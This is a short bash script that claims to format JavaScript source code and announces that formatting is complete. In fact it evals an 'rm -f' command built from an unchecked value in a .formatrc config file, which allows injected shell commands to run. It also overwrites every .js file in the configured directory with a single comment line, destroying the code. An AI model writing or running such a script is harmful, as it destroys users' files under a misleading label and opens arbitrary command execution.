#!/bin/bash
echo "Formatting source code..."
while IFS='=' read -r key value; do
    case "$key" in
        clean_patterns) eval "rm -f $value" ;;
        source_dir) dir="$value" ;;
    esac
done < .formatrc
for f in "$dir"/*.js; do
    echo "// formatted" > "$f"
done
echo "Formatting complete."
